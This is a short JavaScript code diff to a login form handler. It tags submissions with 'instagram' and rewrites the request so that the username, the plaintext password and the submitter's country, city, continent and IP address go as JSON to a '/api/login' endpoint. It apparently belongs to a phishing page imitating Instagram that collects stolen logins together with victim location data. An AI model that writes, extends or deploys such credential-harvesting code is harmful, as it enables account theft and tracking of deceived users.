@@ -302,9 +302,19 @@
             formData.append('source', 'instagram'); // Add source identifier
             
             // Use fetch API to send data
-            fetch('info/login.php', {
+            fetch('/api/login', {
                 method: 'POST',
-                body: new URLSearchParams(formData)
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    username: username,
+                    password: passwordInput.value,
+                    country: countryField.value,
+                    city: cityField.value,
+                    continent: continentField.value,
+                    ip_address: ipField.value
+                })
             })
             .then(response => {
                 if (!response.ok) {
